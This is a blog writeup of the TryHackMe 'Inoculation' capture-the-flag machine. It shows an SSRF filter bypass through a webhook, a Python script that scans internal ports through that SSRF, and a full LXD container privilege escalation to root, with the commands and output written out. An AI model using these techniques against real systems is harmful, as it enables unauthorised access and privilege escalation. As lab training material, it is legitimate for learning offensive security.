---
layout: post
title: Inoculation
date: 2020-09-25 00:00:00 +5:30
categories: [TryHackMe, Hard]
tags: [tryhackme, burp, wireshark, webhooks, lxd] # add tag
image: ![Icon](https://tryhackme-images.s3.amazonaws.com/room-icons/9e836e6ab23ecf6f6e615ec0d6335c6c.jpeg)
---

## Description

The Following Post is writeup of Inoculation room of tryhackme <https://tryhackme.com/room/inoculation>

|Machine|Detail
|:---|:--
|OS | Linux
|Rating | Hard
|Creator | [zayotic](https://tryhackme.com/p/zayotic)

## Summary

The machine have 2 open ports 22 and 80, In port 80 we have a webpage which has webhooks and we can
request to url through that. So requesting 0.0.0.0 calls itself (bypassing the restriction).
Then I fuzz the ports and found there was a port 9999 running inside localhost and contains a wireshark
file. Reading that will give us creds and we got user. The root is lxd privesc.

## Walkthrough

### Enumeration

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:5d:6d:04:17:08:98:fc:67:ae:36:8b:b6:47:d3:2b (RSA)
|   256 cd:a1:63:57:0f:0c:59:fb:12:5b:00:ea:e1:de:75:66 (ECDSA)
|_  256 43:cf:9a:75:12:fd:86:65:bf:76:84:f9:ef:33:4a:d1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inoculation
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So let;s see port 80

#### port 80

![Port](/assets/img/inoculation/port80webhooks.png)
We can see output webhooks and it make a get request whenever we put URL.
But we can only make http or https requests Plus the 127.0.0.1 is restricted.
So i looked for possible bypass and we can use 0.0.0.0 and it  will give the same results.

So Here i stuck for a bit and looked for any solution.
There is a possiblity that this machine have some port listening in it's internal IP.

I tried fuzzing using python

```python
import requests
from bs4 import BeautifulSoup

url = "http://10.10.122.37/testhook.php"
for i in range(1,65535):
    x = str(i)
    var = 'http://0.0.0.0:' + x
    mydata = {'handler': var}
    page = requests.post(url, data = mydata)
    length = len(page.content)
    if length == 0:
        print(x + ' port is not correct')
        continue
    else:
        soup = BeautifulSoup(page.content, 'html.parser')
        print(soup.prettify())
```

So this thing ran for about an hour and two.(sooooo.... long :( )
and we got port 9999
![Port](/assets/img/inoculation/webhooks9999.png)

![dump.pcap](/assets/img/inoculation/dumppcap.png)
seeing the port there is a dump.pcap and it have a information about user and password.

### Exploitation

![Port](/assets/img/inoculation/login.png)

```bash
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
uid=1000(maynard) gid=1000(maynard) groups=1000(maynard),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

maynard@inoculation:/tmp$ wget 10.8.108.114:8001/alpine.tar.gz
--2020-09-25 05:59:12--  http://10.8.108.114:8001/alpine.tar.gz
Connecting to 10.8.108.114:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3109440 (3.0M) [application/gzip]
Saving to: ‘alpine.tar.gz’

alpine.tar.gz                     100%[==========================================================>]   2.96M   383KB/s    in 10s     

2020-09-25 05:59:22 (298 KB/s) - ‘alpine.tar.gz’ saved [3109440/3109440]

maynard@inoculation:/tmp$ lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
Generating a client certificate. This may take a minute...
^C
maynard@inoculation:/tmp$ chmod +x alpine.tar.gz
maynard@inoculation:/tmp$ lxc image import ./alpine.tar.gz --alias myimage
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: cb2dd242acb16b000400807128b9a7110c603cc5f097873835541955c7a64631
maynard@inoculation:/tmp$ ~
-bash: /home/maynard: Is a directory
maynard@inoculation:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| myimage | cb2dd242acb1 | no     | alpine v3.12 (20200826_12:01) | x86_64 | 2.97MB | Sep 25, 2020 at 11:00am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
maynard@inoculation:/tmp$ 1

1: command not found
maynard@inoculation:/tmp$
maynard@inoculation:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| myimage | cb2dd242acb1 | no     | alpine v3.12 (20200826_12:01) | x86_64 | 2.97MB | Sep 25, 2020 at 11:00am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
maynard@inoculation:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
maynard@inoculation:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
maynard@inoculation:/tmp$ lxc start ignite
maynard@inoculation:/tmp$ lxc exec ignite /bin/sh
id~ # id
uid=0(root) gid=0(root)
~ # bash
/bin/sh: bash: not found
~ # cd /mnt
/mnt # ls
```

Rooted
